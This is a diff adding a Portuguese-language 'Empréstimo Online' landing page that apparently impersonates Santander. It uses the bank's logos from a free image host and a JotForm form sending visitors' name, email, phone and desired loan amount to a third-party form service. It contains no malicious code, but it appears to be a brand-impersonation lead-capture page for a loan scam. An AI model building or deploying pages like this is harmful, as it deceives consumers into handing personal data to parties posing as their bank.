@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+ <head>
+  <meta charset="UTF-8">
+  <meta name="viewport"
+   content="width=device-width, initial-scale=1.0">
+   <meta name="theme-color" content="#c00">
+   <meta name="apple-mobile-web-app-status-bar-style" content="#c00">
+   <meta name="msapplication-navbutton-color" content="#c00">
+  <link rel="stylesheet"
+   href="style.css">
+   <script src="script.js"></script>
+  <title>Empréstimos</title>
+  <link rel="icon" 
+      type="image/png" 
+      href="https://i.ibb.co/y0L1hyM/banco-santander-logo-40.png" />
+
+ </head>
+ <body style="background-color: white;">
+<header>
+  <div>
+    <a href="">
+    <img src="https://i.ibb.co/QcFq7WB/Santander-Logo.png" alt="" class="sants"></a>
+  </div>
+  <div>
+    <h1 class="cabecalho">Empréstimo <span id="online">Online</span><span id="facil" style="display: none;">Fácil</span><span id="seguro" style="display: none;">Seguro</span></h1>
+  </div>
+  </header>
+  
+  <section class="cabeca-flex">
+   <div class="flex-container">
+    <div class="imagem">
+     <img
+      src="https://i.ibb.co/zxCRCbX/celsant.pngg"
+    id="img">
+    </div>
+    
+    <div class="texto-flex">
+     <div class="texto">
+      <h2>Encontre a melhor proposta de
+      </h2>
+      <p class="p-black">Empréstimo
+       Pessoal Online</p>
+      <p class="p-color" id="texto">Preencha o
+       formulário abaixo!</p>
+     </div>
+    </div>
+   </div>
+  </section>
+  
+  <section class="corpo-flex">
+   <div class="iframe">
+    <script src="https://cdn01.jotfor.ms/static/prototype.forms.js" type="text/javascript"></script>
+<script src="https://cdn02.jotfor.ms/static/jotform.forms.js?3.3.27350" type="text/javascript"></script>
+<script defer src="https://cdnjs.cloudflare.com/ajax/libs/punycode/1.4.1/punycode.js"></script>
+<script src="https://cdn03.jotfor.ms/js/vendor/jquery-1.8.0.min.js?v=3.3.27350" type="text/javascript"></script>
+<script defer src="https://cdn01.jotfor.ms/js/vendor/maskedinput.min.js?v=3.3.27350" type="text/javascript"></script>
+<script defer src="https://cdn02.jotfor.ms/js/vendor/jquery.maskedinput.min.js?v=3.3.27350" type="text/javascript"></script>
+<script type="text/javascript">	JotForm.newDefaultTheme = true;
+	JotForm.extendsNewTheme = false;
+	JotForm.newPaymentUIForNewCreatedForms = true;
+	JotForm.newPaymentUI = true;
+	JotForm.clearFieldOnHide="disable";
+	JotForm.submitError="jumpToFirstError";
+
+	JotForm.init(function(){
+	/*INIT-START*/
+      JotForm.setPhoneMaskingValidator( 'input_4_full', '(##) #####-####' );
+      JotForm.alterTexts({"ageVerificationError":"Você deve ter mais de {minAge} anos para enviar este formulário.","alphabetic":"Este campo pode conter apenas letras.","alphanumeric":"Este campo pode conter apenas letras e números.","appointmentSelected":"Você selecionou {time} em {date}.","ccDonationMinLimitError":"O valor mínimo é de {minAmount} {currency}","ccInvalidCVC":"Código de verificação (CVV) inválido.","ccInvalidExpireDate":"Data de vencimento inválida.","ccInvalidNumber":"Número do cartão de crédito inválido.","ccMissingDetails":"Please fill up the credit card details.","ccMissingDonation":"Insira valores numéricos para o montante de doação.","ccMissingProduct":"Selecione pelo menos um produto.","characterLimitError":"Excesso de caracteres. O limite é de","characterMinLimitError":"Poucos caracteres. O mínimo é","confirmClearForm":"Tem certeza de que deseja limpar este formulário?","confirmEmail":"E-mail não é correspondente.","currency":"Este campo pode conter apenas valores monetários.","cyrillic":"Este campo pode conter apenas caracteres cirílicos.","dateInvalid":"Esta data não é válida. O formato da data é {format}.","dateInvalidSeparate":"Esta data não é válida. Insira um {element} válido.","dateLimited":"Esta data não está disponível.","disallowDecimals":"Favor inserir um número inteiro.","dragAndDropFilesHere_infoMessage":"Arraste e solte seus arquivos aqui","email":"Insira um endereço de e-mail válido.","fillMask":"Valor do campo deve preencher máscara.","freeEmailError":"Não são permitidas contas de e-mail gratuitas.","generalError":"O formulário contém erros. Por favor, corrija-os antes de continuar.","generalPageError":"Há erros nesta página. Por favor, corrija-os antes de continuar.","gradingScoreError":"Pontuação total deve ser menor ou igual a","incompleteFields":"Há campos obrigatórios incompletos. Por favor, preencha-os.","inputCarretErrorA":"A entrada não deve ser menor que o valor mínimo:","inputCarretErrorB":"A entrada não deve ser maior que o valor máximo:","justSoldOut":"Just Sold Out","lessThan":"Sua pontuação deve ser inferior ou igual a","maxDigitsError":"O número máximo de caracteres permitido é de","maxFileSize_infoMessage":"Tamanho máx.","maxSelectionsError":"The maximum number of selections allowed is ","minSelectionsError":"O número mínimo de seleções exigido é","multipleFileUploads_emptyError":"{file} está vazio. Por favor, selecione os arquivos novamente.","multipleFileUploads_fileLimitError":"São permitidos apenas {fileLimit} uploads.","multipleFileUploads_minSizeError":"O arquivo {file} é muito pequeno. O tamanho mínimo é de {minSizeLimit}.","multipleFileUploads_onLeave":"O upload de arquivos está em andamento. Se você sair agora, o envio será cancelado.","multipleFileUploads_sizeError":"O arquivo {file} é muito grande. O tamanho máximo é de {minSizeLimit}.","multipleFileUploads_typeError":"O arquivo {file} possui uma extensão inválida. São permitidas apenas as extensões {extensions}.","multipleFileUploads_uploadFailed":"File upload failed, please remove it and upload the file again.","noSlotsAvailable":"Nenhum horário disponível","notEnoughStock":"Not enough stock for the current selection","notEnoughStock_remainedItems":"Not enough stock for the current selection ({count} items left)","noUploadExtensions":"File has no extension file type (e.g. .txt, .png, .jpeg)","numeric":"Este campo pode conter apenas números.","pastDatesDisallowed":"A data não pode estar no passado.","pleaseWait":"Por favor, aguarde...","required":"Este campo é obrigatório.","requireEveryCell":"Toda célula é obrigatória.","requireEveryRow":"Todos as linhas são obrigatórias.","requireOne":"Pelo menos um campo é obrigatório.","restrictedDomain":"This domain is not allowed","selectionSoldOut":"Selection Sold Out","slotUnavailable":"{time} em {date} já foi ocupado. Selecione outro horário.","soldOut":"Sold Out","subProductItemsLeft":"({count} items left)","uploadExtensions":"Somente é possível fazer upload dos seguintes arquivos:","uploadFilesize":"O tamanho do arquivo não pode ser maior que:","uploadFilesizemin":"O ficheiro não pode ser menor que:","url":"Este campo pode conter apenas uma URL válida.","validateEmail":"You need to validate this e-mail","wordLimitError":"Excesso de palavras. O limite é de","wordMinLimitError":"Poucas palavras. O mínimo é"});
+	/*INIT-END*/
+	});
+
+   JotForm.prepareCalculationsOnTheFly([null,null,{"name":"submit2","qid":"2","text":"Enviar","type":"control_button"},{"description":"","name":"nome","qid":"3","text":"Nome","type":"control_fullname"},{"description":"","name":"telefone","qid":"4","text":"Telefone","type":"control_phone"},{"description":"","name":"email","qid":"5","subLabel":"","text":"E-mail","type":"control_email"},{"description":"","name":"valorDo6","qid":"6","subLabel":"","text":"Valor do Emprestimo","type":"control_dropdown"}]);
+   setTimeout(function() {
+JotForm.paymentExtrasOnTheFly([null,null,{"name":"submit2","qid":"2","text":"Enviar","type":"control_button"},{"description":"","name":"nome","qid":"3","text":"Nome","type":"control_fullname"},{"description":"","name":"telefone","qid":"4","text":"Telefone","type":"control_phone"},{"description":"","name":"email","qid":"5","subLabel":"","text":"E-mail","type":"control_email"},{"description":"","name":"valorDo6","qid":"6","subLabel":"","text":"Valor do Emprestimo","type":"control_dropdown"}]);}, 20); 
+</script>
+<style type="text/css">@media print{.form-section{display:inline!important}.form-pagebreak{display:none!important}.form-section-closed{height:auto!important}.page-section{position:initial!important}}</style>
+<link type="text/css" rel="stylesheet" href="https://cdn01.jotfor.ms/themes/CSS/5e6b428acc8c4e222d1beb91.css?themeRevisionID=5f7ed99c2c2c7240ba580251"/>
+<link type="text/css" rel="stylesheet" href="https://cdn02.jotfor.ms/css/styles/payment/payment_styles.css?3.3.27350" />
+<link type="text/css" rel="stylesheet" href="https://cdn03.jotfor.ms/css/styles/payment/payment_feature.css?3.3.27350" />
+<style type="text/css" id="form-designer-style">
+    /* Injected CSS Code */
+
+*,
+*:after,
+*:before {
+  box-sizing: border-box;
+}
+.form-all {
+  font-family: "Inter", sans-serif;
+}
+.main .jotform-form {
+  width: 100%;
+  padding: 0 3%;
+}
+.form-all {
+  display: flex;
+  flex-direction: column;
+  width: 100%;
+  max-width: 752px;
+}
+.form-line-active {
+  background-color: #ffffe0;
+}
+.form-all {
+  font-size: 16px;
+}
+li.form-line {
+  margin-top: -6px;
+  margin-bottom: -6px;
+}
+.form-line {
+  padding: 12px 10px;
+}
+.supernova .form-all,
+.form-all {
+  border-radius: 20px;
+}
+.form-section:first-child {
+  border-radius: 20px 20px 0 0;
+}
+.form-section:last-child {
+  border-radius: 0 0 20px 20px;
+}
+.form-section {
+  padding: 0px 38px;
+}
+.form-textbox,
+.form-textarea,
+.form-radio-other-input,
+.form-checkbox-other-input,
+.form-captcha input,
+.form-spinner input {
+  background-color: #ffffff;
+}
+.form-label {
+  font-family: "Inter", sans-serif;
+}
+.form-line-column {
+  width: calc(50% - 8px);
+}
+.form-checkbox-item label,
+.form-checkbox-item span,
+.form-radio-item label,
+.form-radio-item span {
+  color: #404a64;
+}
+.form-radio-item,
+.form-checkbox-item {
+  padding-bottom: 0px !important;
+}
+.form-radio-item:last-child,
+.form-checkbox-item:last-child {
+  padding-bottom: 0;
+}
+.form-single-column .form-checkbox-item,
+.form-single-column .form-radio-item {
+  width: 100%;
+}
+.form-checkbox-item .editor-container div,
+.form-radio-item .editor-container div {
+  position: relative;
+}
+.form-checkbox-item .editor-container div:before,
+.form-radio-item .editor-container div:before {
+  display: inline-block;
+  vertical-align: middle;
+  left: 0;
+  width: 20px;
+  height: 20px;
+}
+.form-all .form-submit-button {
+  font-size: 16px;
+  font-weight: normal;
+  font-family: "Inter", sans-serif;
+}
+.form-all .form-submit-button:not(.form-sacl-button) {
+  min-width: 180px;
+}
+.form-all .form-submit-button.js-new-sacl-button,
+.form-all .form-submit-print {
+  min-width: 98px;
+}
+.form-all .form-pagebreak-back,
+.form-all .form-pagebreak-next {
+  font-family: "Inter", sans-serif;
+  font-size: 16px;
+  font-weight: normal;
+}
+.form-all .form-pagebreak-back,
+.form-all .form-pagebreak-next {
+  min-width: 128px;
+}
+li[data-type="control_image"] div {
+  text-align: left;
+}
+li[data-type="control_image"] img {
+  border: none;
+  border-width: 0px !important;
+  border-style: solid !important;
+  border-color: false !important;
+}
+.supernova {
+  height: 100%;
+  background-repeat: no-repeat;
+  background-attachment: scroll;
+  background-position: center top;
+  background-repeat: repeat;
+}
+.supernova {
+  background-image: none;
+}
+#stage {
+  background-image: none;
+}
+/* | */
+.form-all {
+  background-repeat: no-repeat;
+  background-attachment: scroll;
+  background-position: center top;
+  background-repeat: repeat;
+}
+.form-header-group {
+  background-repeat: no-repeat;
+  background-attachment: scroll;
+  background-position: center top;
+}
+.header-large h1.form-header {
+  font-size: 2em;
+}
+.header-large h2.form-header {
+  font-size: 1.5em;
+}
+.header-large h3.form-header {
+  font-size: 1.17em;
+}
+.header-large h1 + .form-subHeader {
+  font-size: 1em;
+}
+.header-large h2 + .form-subHeader {
+  font-size: .875em;
+}
+.header-large h3 + .form-subHeader {
+  font-size: .75em;
+}
+.header-default h1.form-header {
+  font-size: 2em;
+}
+.header-default h2.form-header {
+  font-size: 1.5em;
+}
+.header-default h3.form-header {
+  font-size: 1.17em;
+}
+.header-default h1 + .form-subHeader {
+  font-size: 1em;
+}
+.header-default h2 + .form-subHeader {
+  font-size: .875em;
+}
+.header-default h3 + .form-subHeader {
+  font-size: .75em;
+}
+.header-small h1.form-header {
+  font-size: 2em;
+}
+.header-small h2.form-header {
+  font-size: 1.5em;
+}
+.header-small h3.form-header {
+  font-size: 1.17em;
+}
+.header-small h1 + .form-subHeader {
+  font-size: 1em;
+}
+.header-small h2 + .form-subHeader {
+  font-size: .875em;
+}
+.header-small h3 + .form-subHeader {
+  font-size: .75em;
+}
+.form-header-group {
+  text-align: left;
+}
+.form-header-group {
+  font-family: "Inter", sans-serif;
+}
+div.form-header-group.header-large {
+  margin: 0px -38px;
+}
+div.form-header-group.header-large {
+  padding: 40px 52px;
+}
+.form-header-group .form-header,
+.form-header-group .form-subHeader {
+  color: 0;
+}
+.form-line-error {
+  overflow: hidden;
+  -webkit-transition-property: none;
+  -moz-transition-property: none;
+  -ms-transition-property: none;
+  -o-transition-property: none;
+  transition-property: none;
+  -webkit-transition-duration: 0.3s;
+  -moz-transition-duration: 0.3s;
+  -ms-transition-duration: 0.3s;
+  -o-transition-duration: 0.3s;
+  transition-duration: 0.3s;
+  -webkit-transition-timing-function: ease;
+  -moz-transition-timing-function: ease;
+  -ms-transition-timing-function: ease;
+  -o-transition-timing-function: ease;
+  transition-timing-function: ease;
+  background-color: #fff4f4;
+}
+.form-line-error .form-error-message {
+  background-color: #f23a3c;
+  clear: both;
+  float: none;
+}
+.form-line-error .form-error-message .form-error-arrow {
+  border-bottom-color: #f23a3c;
+}
+.form-line-error input:not(#coupon-input),
+.form-line-error textarea,
+.form-line-error .form-validation-error {
+  border: 1px solid #f23a3c;
+  box-shadow: 0 0 3px #f23a3c;
+}
+.supernova {
+  background-color: #ffffff;
+  background-color: #ecedf3;
+}
+.supernova body {
+  background-color: transparent;
+}
+.supernova .form-all,
+.form-all {
+  background-color: #ffffff;
+}
+.form-textbox,
+.form-textarea,
+.form-radio-other-input,
+.form-checkbox-other-input,
+.form-captcha input,
+.form-spinner input {
+  background-color: #ffffff;
+}
+.form-matrix-table tr {
+  border-color: #e6e6e6;
+}
+.form-matrix-table tr:nth-child(2n) {
+  background-color: #f2f2f2;
+}
+.form-all {
+  color: #2c3345;
+}
+.form-label-top,
+.form-label-left,
+.form-label-right,
+.form-html {
+  color: #2c3345;
+}
+.form-line-error {
+  overflow: hidden;
+  -webkit-transition-property: none;
+  -moz-transition-property: none;
+  -ms-transition-property: none;
+  -o-transition-property: none;
+  transition-property: none;
+  -webkit-transition-duration: 0.3s;
+  -moz-transition-duration: 0.3s;
+  -ms-transition-duration: 0.3s;
+  -o-transition-duration: 0.3s;
+  transition-duration: 0.3s;
+  -webkit-transition-timing-function: ease;
+  -moz-transition-timing-function: ease;
+  -ms-transition-timing-function: ease;
+  -o-transition-timing-function: ease;
+  transition-timing-function: ease;
+  background-color: #fff4f4;
+}
+.form-header-group .form-header,
+.form-header-group .form-subHeader {
+  color: 0;
+}
+
+/*__INSPECT_SEPERATOR__*/
+
+    /* Injected CSS Code */
+</style>
+
+<form class="jotform-form" action="https://submit.jotform.com/submit/212407044409044/" method="post" name="form_212407044409044" id="212407044409044" accept-charset="utf-8" autocomplete="on">
+  <input type="hidden" name="formID" value="212407044409044" />
+  <input type="hidden" id="JWTContainer" value="" />
+  <input type="hidden" id="cardinalOrderNumber" value="" />
+  <div role="main" class="form-all">
+    <style>
+      .form-all:before { background: none;}
+    </style>
+    <ul class="form-section page-section">
+      <li class="form-line form-line-column form-col-1" data-type="control_fullname" id="id_3">
+        <label class="form-label form-label-top" id="label_3" for="first_3"> Nome </label>
+        <div id="cid_3" class="form-input-wide" data-layout="full">
+          <div data-wrapper-react="true">
+            <span class="form-sub-label-container" style="vertical-align:top" data-input-type="first">
+              <input type="text" id="first_3" name="q3_nome[first]" class="form-textbox" size="10" value="" data-component="first" aria-labelledby="label_3 sublabel_3_first" />
+              <label class="form-sub-label" for="first_3" id="sublabel_3_first" style="min-height:13px" aria-hidden="false"> Nome </label>
+            </span>
+            <span class="form-sub-label-container" style="vertical-align:top" data-input-type="last">
+              <input type="text" id="last_3" name="q3_nome[last]" class="form-textbox" size="15" value="" data-component="last" aria-labelledby="label_3 sublabel_3_last" />
+              <label class="form-sub-label" for="last_3" id="sublabel_3_last" style="min-height:13px" aria-hidden="false"> Sobrenome </label>
+            </span>
+          </div>
+        </div>
+      </li>
+      <li class="form-line form-line-column form-col-2" data-type="control_email" id="id_5">
+        <label class="form-label form-label-top" id="label_5" for="input_5"> E-mail </label>
+        <div id="cid_5" class="form-input-wide" data-layout="half">
+          <input type="email" id="input_5" name="q5_email" class="form-textbox validate[Email]" style="width:310px" size="310" value="" data-component="email" aria-labelledby="label_5" />
+        </div>
+      </li>
+      <li class="form-line form-line-column form-col-3" data-type="control_phone" id="id_4">
+        <label class="form-label form-label-top" id="label_4" for="input_4_full"> Telefone </label>
+        <div id="cid_4" class="form-input-wide" data-layout="half">
+          <span class="form-sub-label-container" style="vertical-align:top">
+            <input type="tel" id="input_4_full" name="q4_telefone[full]" data-type="mask-number" class="mask-phone-number form-textbox validate[Fill Mask]" style="width:310px" data-masked="true" value="" placeholder="(00) 00000-0000" data-component="phone" aria-labelledby="label_4" />
+            <label class="form-sub-label is-empty" for="input_4_full" id="sublabel_4_masked" style="min-height:13px" aria-hidden="false">  </label>
+          </span>
+        </div>
+      </li>
+      <li class="form-line form-line-column form-col-4" data-type="control_dropdown" id="id_6">
+        <label class="form-label form-label-top" id="label_6" for="input_6"> Valor do Empréstimo </label>
+        <div id="cid_6" class="form-input-wide" data-layout="half">
+          <select class="form-dropdown" id="input_6" name="q6_valorDo6" style="width:310px" data-component="dropdown">
+            <option value=""> Favor selecionar </option>
+            <option selected="" value="3.000"> 3.000 </option>
+            <option value="5.000"> 5.000 </option>
+            <option value="10.000"> 10.000 </option>
+            <option value="15.000"> 15.000 </option>
+            <option value="20.000"> 20.000 </option>
+            <option value="25.000"> 25.000 </option>
+            <option value="50.000"> 50.000 </option>
+            <option value="100.000"> 100.000 </option>
+          </select>
+        </div>
+      </li>
+      <li class="form-line" data-type="control_button" id="id_2">
+        <div id="cid_2" class="form-input-wide" data-layout="full">
+          <div data-align="auto" class="form-buttons-wrapper form-buttons-auto   jsTest-button-wrapperField">
+            <button id="input_2" type="submit" class="form-submit-button submit-button jf-form-buttons jsTest-submitField" data-component="button" data-content="">
+              Enviar
+            </button>
+          </div>
+        </div>
+      </li>
+      <li style="display:none">
+        Should be Empty:
+        <input type="text" name="website" value="" />
+      </li>
+    </ul>
+  </div>
+  <script>
+  JotForm.showJotFormPowered = "new_footer";
+  </script>
+  <script>
+  JotForm.poweredByText = "Criado com JotForm";
+  </script>
+  <input type="hidden" class="simple_spc" id="simple_spc" name="simple_spc" value="212407044409044" />
+  <script type="text/javascript">
+  var all_spc = document.querySelectorAll("form[id='212407044409044'] .si" + "mple" + "_spc");
+for (var i = 0; i < all_spc.length; i++)
+{
+  all_spc[i].value = "212407044409044-212407044409044";
+}
+  </script>
+  <div class="formFooter-heightMask">
+  </div>
+</form>
+<script src="https://cdn.jotfor.ms//js/vendor/smoothscroll.min.js?v=3.3.27350"></script>
+<script src="https://cdn.jotfor.ms//js/errorNavigation.js?v=3.3.27350"></script>
+   </div>
+   
+   <div class="svg">
+    <svg
+     xmlns="http://www.w3.org/2000/svg"
+     viewBox="0 0 1440 320">
+     <path fill="#c00"
+      fill-opacity="1"
+      d="M0,96L48,85.3C96,75,192,53,288,74.7C384,96,480,160,576,186.7C672,213,768,203,864,176C960,149,1056,107,1152,85.3C1248,64,1344,64,1392,64L1440,64L1440,320L1392,320C1344,320,1248,320,1152,320C1056,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Z">
+     </path>
+    </svg>
+    
+    <div class="escritos">
+     
+     <div>
+      <h2>Transparência, <br>facilidade e
+       <br>segurança</h2>
+     </div>
+     
+     <div>
+      <img
+       src="https://i.ibb.co/BnGbbQR/cena-cadastro-1.png"
+       alt="">
+     </div>
+    </div>
+    <div class="svg-abaixo">
+     <svg
+      xmlns="http://www.w3.org/2000/svg"
+      viewBox="0 0 1440 320">
+      <path fill="#c00"
+       fill-opacity="1"
+       d="M0,192L48,192C96,192,192,192,288,208C384,224,480,256,576,256C672,256,768,224,864,208C960,192,1056,192,1152,208C1248,224,1344,256,1392,272L1440,288L1440,0L1392,0C1344,0,1248,0,1152,0C1056,0,960,0,864,0C768,0,672,0,576,0C480,0,384,0,288,0C192,0,96,0,48,0L0,0Z">
+      </path>
+     </svg>
+    </div>
+    
+    <div class="escritos-segundo">
+     <div>
+      <img
+       src="https://i.ibb.co/3TRBgr3/100-online.png"
+       alt="">
+     </div>
+     
+     <div>
+      <h2>Contratação 100% <br>online
+      </h2>
+     </div>
+    </div>
+    <div class="teste">
+     <svg
+      xmlns="http://www.w3.org/2000/svg"
+      viewBox="0 0 1440 320">
+      <path fill="#c00"
+       fill-opacity="1"
+       d="M0,192L48,192C96,192,192,192,288,208C384,224,480,256,576,256C672,256,768,224,864,208C960,192,1056,192,1152,208C1248,224,1344,256,1392,272L1440,288L1440,320L1392,320C1344,320,1248,320,1152,320C1056,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Z">
+      </path>
+     </svg>
+    </div>
+   </div>
+   
+   <div class="escritos-terceiro">
+    <div>
+     <h2 class="ahadois">Análise rápida e
+      <br>segura<br><br>
+      Todo suporte necessário!</h2>
+    </div>
+    
+    <div>
+     <img
+      src="https://i.ibb.co/0rKD38M/analise-rapida.png"
+      alt="">
+    </div>
+    
+   </div>
+   <div style="width: 100%; margin-top: -2px;">
+    <svg
+     xmlns="http://www.w3.org/2000/svg"
+     viewBox="0 0 1440 320">
+     <path fill="#c00"
+      fill-opacity="1"
+      d="M0,96L48,85.3C96,75,192,53,288,74.7C384,96,480,160,576,186.7C672,213,768,203,864,176C960,149,1056,107,1152,85.3C1248,64,1344,64,1392,64L1440,64L1440,0L1392,0C1344,0,1248,0,1152,0C1056,0,960,0,864,0C768,0,672,0,576,0C480,0,384,0,288,0C192,0,96,0,48,0L0,0Z">
+     </path>
+    </svg>
+    
+   </div>
+
+   <div style="width: 100%; background-color: #c00; margin-top: -2px;" data-negative="true">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 283.5 27.8" fill="white">
+        <path d="M0 0v6.7c1.9-.8 4.7-1.4 8.5-1 9.5 1.1 11.1 6 11.1 6s2.1-.7 4.3-.2c2.1.5 2.8 2.6 2.8 2.6s.2-.5 1.4-.7c1.2-.2 1.7.2 1.7.2s0-2.1 1.9-2.8c1.9-.7 3.6.7 3.6.7s.7-2.9 3.1-4.1 4.7 0 4.7 0 1.2-.5 2.4 0 1.7 1.4 1.7 1.4h1.4c.7 0 1.2.7 1.2.7s.8-1.8 4-2.2c3.5-.4 5.3 2.4 6.2 4.4.4-.4 1-.7 1.8-.9 2.8-.7 4 .7 4 .7s1.7-5 11.1-6c9.5-1.1 12.3 3.9 12.3 3.9s1.2-4.8 5.7-5.7c4.5-.9 6.8 1.8 6.8 1.8s.6-.6 1.5-.9c.9-.2 1.9-.2 1.9-.2s5.2-6.4 12.6-3.3c7.3 3.1 4.7 9 4.7 9s1.9-.9 4 0 2.8 2.4 2.8 2.4 1.9-1.2 4.5-1.2 4.3 1.2 4.3 1.2.2-1 1.4-1.7 2.1-.7 2.1-.7-.5-3.1 2.1-5.5 5.7-1.4 5.7-1.4 1.5-2.3 4.2-1.1c2.7 1.2 1.7 5.2 1.7 5.2s.3-.1 1.3.5c.5.4.8.8.9 1.1.5-1.4 2.4-5.8 8.4-4 7.1 2.1 3.5 8.9 3.5 8.9s.8-.4 2 0 1.1 1.1 1.1 1.1 1.1-1.1 2.3-1.1 2.1.5 2.1.5 1.9-3.6 6.2-1.2 1.9 6.4 1.9 6.4 2.6-2.4 7.4 0c3.4 1.7 3.9 4.9 3.9 4.9s3.3-6.9 10.4-7.9 11.5 2.6 11.5 2.6.8 0 1.2.2c.4.2.9.9.9.9s4.4-3.1 8.3.2c1.9 1.7 1.5 5 1.5 5s.3-1.1 1.6-1.4c1.3-.3 2.3.2 2.3.2s-.1-1.2.5-1.9 1.9-.9 1.9-.9-4.7-9.3 4.4-13.4c5.6-2.5 9.2.9 9.2.9s5-6.2 15.9-6.2 16.1 8.1 16.1 8.1.7-.2 1.6-.4V0H0z"></path></svg>
+   </div>
+   <div class="texto-emprestimo" style="background-color: #c00;">
+    <div class="ajuste-texto">
+        <h1 style="width: 100%; text-align: center; font-size: 33px;">Como solicitar empréstimo online</h1><br>
+        <span>O processo é o mais simples do mercado. Pedimos o mínimo de documentos e tudo acontece em 5 passos:</span><br>
+        <br>
+        <p style="font-family: Arial, Helvetica, sans-serif; font-size: 22px; font-weight: 600; color: orange;">1. Simulação</p>
+        
+        <span >Faça uma simulação online pelo nosso simulador. Você só precisa preencher alguns campos e pronto! Leva só 3 minutos. A simulação do empréstimo online é importante, porque, com ela, você tem melhor noção de qual será o investimento da operação.</span>
+        
+        <p style="font-family: Arial, Helvetica, sans-serif; font-size: 22px; font-weight: 600; color: orange;">2. Pedido</p>
+        
+        <span>Faça o pedido do seu empréstimo diretamente do seu computador ou dispositivo móvel. Para seguir com o processo, basta você finalizar a simulação e nossos consultores farão a análise do seu pedido e entrarão em contato.</span>
+        
+        <p style="font-family: Arial, Helvetica, sans-serif; font-size: 22px; font-weight: 600; color: orange;">3. Avaliação financeira</p>
+        
+        <span>profissionais fazem a sua avaliação de crédito, de maneira segura, rápida (até 2 dias) e prática. Isso garante que você tenha a melhor experiência possível para a sua solicitação de empréstimo online.</span>
+        
+        <p style="font-family: Arial, Helvetica, sans-serif; font-size: 22px; font-weight: 600; color: orange;">4. Documentação e assinatura</p>
+        
+        <span>Depois do crédito aprovado, providenciamos os documentos para você e emitimos para a sua assinatura. Tudo isso sem dor de cabeça.</span>
+        
+        <p style="font-family: Arial, Helvetica, sans-serif; font-size: 22px; font-weight: 600; color: orange;">5. Dinheiro liberado</p>
+        
+        <span>Com tudo aprovado, é hora de assinar o contrato e receber o seu dinheiro. Simples e eficiente como deve ser!</span>
+
+        </p>
+    </div>
+   </div>
+   <div style="width: 100%; background-color: #c00;" data-negative="false" class="elementor">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 283.5 27.8" fill="#ecedf3">
+        <path d="M0 0v6.7c1.9-.8 4.7-1.4 8.5-1 9.5 1.1 11.1 6 11.1 6s2.1-.7 4.3-.2c2.1.5 2.8 2.6 2.8 2.6s.2-.5 1.4-.7c1.2-.2 1.7.2 1.7.2s0-2.1 1.9-2.8c1.9-.7 3.6.7 3.6.7s.7-2.9 3.1-4.1 4.7 0 4.7 0 1.2-.5 2.4 0 1.7 1.4 1.7 1.4h1.4c.7 0 1.2.7 1.2.7s.8-1.8 4-2.2c3.5-.4 5.3 2.4 6.2 4.4.4-.4 1-.7 1.8-.9 2.8-.7 4 .7 4 .7s1.7-5 11.1-6c9.5-1.1 12.3 3.9 12.3 3.9s1.2-4.8 5.7-5.7c4.5-.9 6.8 1.8 6.8 1.8s.6-.6 1.5-.9c.9-.2 1.9-.2 1.9-.2s5.2-6.4 12.6-3.3c7.3 3.1 4.7 9 4.7 9s1.9-.9 4 0 2.8 2.4 2.8 2.4 1.9-1.2 4.5-1.2 4.3 1.2 4.3 1.2.2-1 1.4-1.7 2.1-.7 2.1-.7-.5-3.1 2.1-5.5 5.7-1.4 5.7-1.4 1.5-2.3 4.2-1.1c2.7 1.2 1.7 5.2 1.7 5.2s.3-.1 1.3.5c.5.4.8.8.9 1.1.5-1.4 2.4-5.8 8.4-4 7.1 2.1 3.5 8.9 3.5 8.9s.8-.4 2 0 1.1 1.1 1.1 1.1 1.1-1.1 2.3-1.1 2.1.5 2.1.5 1.9-3.6 6.2-1.2 1.9 6.4 1.9 6.4 2.6-2.4 7.4 0c3.4 1.7 3.9 4.9 3.9 4.9s3.3-6.9 10.4-7.9 11.5 2.6 11.5 2.6.8 0 1.2.2c.4.2.9.9.9.9s4.4-3.1 8.3.2c1.9 1.7 1.5 5 1.5 5s.3-1.1 1.6-1.4c1.3-.3 2.3.2 2.3.2s-.1-1.2.5-1.9 1.9-.9 1.9-.9-4.7-9.3 4.4-13.4c5.6-2.5 9.2.9 9.2.9s5-6.2 15.9-6.2 16.1 8.1 16.1 8.1.7-.2 1.6-.4V0H0z"></path></svg>
+   </div>
+   
+  </section>
+
+
+  
+ </body>
+</html>
